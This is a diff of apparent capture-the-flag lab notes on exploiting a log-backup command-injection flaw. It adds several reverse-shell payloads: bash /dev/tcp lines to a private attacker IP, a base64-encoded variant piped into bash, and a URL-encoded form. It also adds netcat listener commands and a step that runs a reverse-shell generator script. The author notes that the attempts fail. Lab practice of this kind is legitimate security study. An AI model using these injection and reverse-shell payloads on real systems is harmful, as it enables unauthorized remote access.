@@ -114,18 +114,63 @@ Created backup: Created backup: /var/log/app/logfile-undefined.1780789801938.gz
 Let's start a rev shell listener:
 
 ```sh
-nc -nvlp 4444
+sudo nc -nvlp 23
 ```
 
 And inject this payload:
 
 ```txt
+; bash -i >& /dev/tcp/192.168.49.52/23 0>&1 ;
 
-; TODO ;
+# this fails, but we get this output:
+
+Created backup: Created backup: /var/log/app/logfile-; bash -i >.gz
+```
+
+The `&` in `>&` is being interpreted as a shell background operator, splitting the command.
+
+**Option 1 — avoid `&` entirely:**
+
+```txt
+; bash -i > /dev/tcp/192.168.49.52/23 0<&1 2>&1 ;
+```
+
+**Option 2 — base64 encode to bypass special char interpretation:**
+
+```sh
+# generate on attacker machine
+echo "bash -i >& /dev/tcp/192.168.49.52/23 0>&1" | base64 -w 0
+```
+
+Then inject the output:
+
+```txt
+; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjUyLzIzIDA+JjEK | base64 -d | bash ;
+```
+
+Yeah, these fail too. Going to look up a guide for OSCP Interface.
+
+https://bing0o.github.io/posts/pg-interface/
+
+```sh
+# in separate terminal
+nc -nvlp 445
+
+git clone https://github.com/bing0o/Reverse_Shell_Generator
+
+cd Reverse_Shell_Generator
+
+chmod +x ./payload.sh
+
+./payload.sh -r -i 192.168.49.52 -p 445 -e url
+
+ip a | grep 192 #192.168.49.52
+
+# ;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.52%2F445+0%3E%261;
 
 ```
 
-
+Darn. This doesn't seem to work. I think we're really close.
 
 ## Non-root access
 
